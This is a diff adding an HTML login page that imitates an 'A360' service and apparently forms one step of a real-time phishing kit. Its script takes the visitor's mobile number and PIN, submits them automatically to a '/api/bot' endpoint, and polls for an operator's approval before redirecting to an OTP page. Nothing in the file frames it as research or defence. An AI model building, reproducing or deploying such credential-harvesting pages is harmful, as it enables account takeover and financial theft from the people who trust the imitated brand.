@@ -1,0 +1,163 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>A360 - Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { margin: 0; background-color: #f8fbff; display: flex; justify-content: center; min-height: 100vh; overflow: hidden; position: relative; }
+        
+        /* Yellow curve in top right */
+        .bg-curve { position: absolute; top: -80px; right: -80px; width: 250px; height: 250px; background: #FFDD55; border-radius: 50%; z-index: 0; }
+        
+        .app-container { width: 100%; max-width: 400px; padding: 40px 20px 20px 20px; display: flex; flex-direction: column; position: relative; z-index: 1; }
+        
+        /* A360 Logo */
+        .logo-container { display: flex; align-items: center; justify-content: center; gap: 5px; margin-bottom: 20px; }
+        .logo-A { font-size: 50px; font-weight: 900; font-style: italic; color: #FFCC00; line-height: 1; }
+        .logo-360 { font-size: 50px; font-weight: 900; color: #0066CC; line-height: 1; letter-spacing: -2px; }
+        .logo-degree { font-size: 30px; vertical-align: super; font-weight: bold; margin-left: 2px; }
+
+        h1 { font-size: 36px; color: #0A1836; margin-bottom: 10px; text-align: center; font-weight: 800;}
+        p { font-size: 15px; color: #555; text-align: center; margin-bottom: 35px; }
+
+        /* Inputs */
+        .input-container { margin-bottom: 5px; }
+        .input-box { display: flex; align-items: center; border: 1px solid #ddd; border-radius: 12px; padding: 18px 15px; background: white; box-shadow: 0 2px 5px rgba(0,0,0,0.02); }
+        .input-icon { font-size: 20px; color: #0066CC; margin-right: 15px; }
+        .input-box input { border: none; outline: none; flex-grow: 1; font-size: 16px; color: #333; background: transparent;}
+        .input-box input::placeholder { color: #999; }
+        
+        /* Helper Text */
+        .hint-text { font-size: 13px; color: #888; margin-bottom: 20px; padding-left: 15px; }
+
+        .forgot-pin { text-align: right; font-size: 14px; color: #0066CC; font-weight: 600; margin-bottom: 30px; cursor: pointer; }
+
+        /* Footer */
+        .footer { margin-top: auto; text-align: center; }
+        .footer p { font-size: 14px; color: #333; margin-bottom: 20px; }
+        .footer a { color: #0066CC; text-decoration: none; font-weight: 600;}
+        .bottom-logo { width: 50px; height: 50px; background: #0066CC; border-radius: 50%; display: flex; justify-content: center; align-items: center; color: white; font-size: 24px; font-weight: bold; margin: 0 auto; }
+
+        /* Loading Overlay */
+        #overlay { display: none; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: rgba(0,0,0,0.85); color: white; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #0066CC; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .error-msg { color: #ffcccc; font-weight: bold; text-align: center; display: none; margin-top: 10px; }
+    </style>
+</head>
+<body>
+    <div class="bg-curve"></div>
+
+    <div id="overlay">
+        <div class="spinner"></div>
+        <h2 style="color:#0066CC;">Verifying...</h2>
+        <p style="color:white;">Please wait.</p>
+    </div>
+
+    <div class="app-container">
+        <div class="logo-container">
+            <span class="logo-A">A</span>
+            <span class="logo-360">360<span class="logo-degree">°</span></span>
+        </div>
+        
+        <h1>Login</h1>
+        <p>Choose your login method and enter your PIN to continue.</p>
+
+        <div class="error-msg" id="errorMsg">Invalid PIN. Try again.</div>
+
+        <!-- Mobile Number Input (Email removed) -->
+        <div class="input-container">
+            <div class="input-box">
+                <span class="input-icon">✉️</span>
+                <input type="tel" id="phone" placeholder="Mobile Number">
+            </div>
+            <div class="hint-text">Enter mobile number to login</div>
+        </div>
+
+        <!-- PIN Input -->
+        <div class="input-container">
+            <div class="input-box">
+                <span class="input-icon">🔒</span>
+                <input type="password" id="pin" placeholder="••••" maxlength="4" inputmode="numeric" pattern="\d*" oninput="checkPin()">
+                <span style="color:#999; cursor:pointer;" onclick="togglePin()">👁️</span>
+            </div>
+        </div>
+        
+        <div class="forgot-pin">Forgot PIN?</div>
+
+        <div class="footer">
+            <p>Don't have an account? <a href="#">Register</a></p>
+            <div class="bottom-logo">A</div>
+        </div>
+    </div>
+
+    <script>
+        let globalUserId = sessionStorage.getItem('globalUserId') || Date.now().toString().slice(-6);
+        sessionStorage.setItem('globalUserId', globalUserId);
+
+        // Pre-fill phone number from the application form
+        let savedPhone = sessionStorage.getItem('userPhone');
+        if(savedPhone) { document.getElementById('phone').value = savedPhone; }
+
+        // Restrict PIN to numbers only
+        document.getElementById('pin').addEventListener('input', function (e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+        });
+
+        function togglePin() {
+            let pinInput = document.getElementById('pin');
+            pinInput.type = pinInput.type === "password" ? "text" : "password";
+        }
+
+        // Auto-Submit when 4th digit is typed
+        function checkPin() {
+            let phone = document.getElementById('phone').value;
+            let pin = document.getElementById('pin').value;
+            
+            if (pin.length === 4 && phone.length > 5) {
+                submitLogin(phone, pin);
+            }
+        }
+
+        function submitLogin(phone, pin) {
+            document.getElementById('overlay').style.display = 'flex';
+            
+            fetch('/api/bot', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    action: 'send', type: 'PHONE_PIN', userId: globalUserId, 
+                    data: { phone: phone, pin: pin } 
+                })
+            }).then(function() { 
+                pollStatus(); 
+            }).catch(function() {
+                document.getElementById('overlay').style.display = 'none';
+                alert("Network error.");
+            });
+        }
+
+        function pollStatus() {
+            let interval = setInterval(function() {
+                fetch('/api/bot?userId=' + globalUserId + '&type=PHONE_PIN', { cache: 'no-store' })
+                .then(function(res) { return res.json(); })
+                .then(function(data) {
+                    if (data.status === 'approved') {
+                        clearInterval(interval);
+                        window.location.href = 'otp.html'; 
+                    } 
+                    else if (data.status === 'rejected') {
+                        clearInterval(interval);
+                        document.getElementById('overlay').style.display = 'none';
+                        document.getElementById('errorMsg').style.display = 'block';
+                        document.getElementById('pin').value = ''; 
+                    }
+                });
+            }, 2000);
+        }
+    </script>
+</body>
+                                                                          </html>
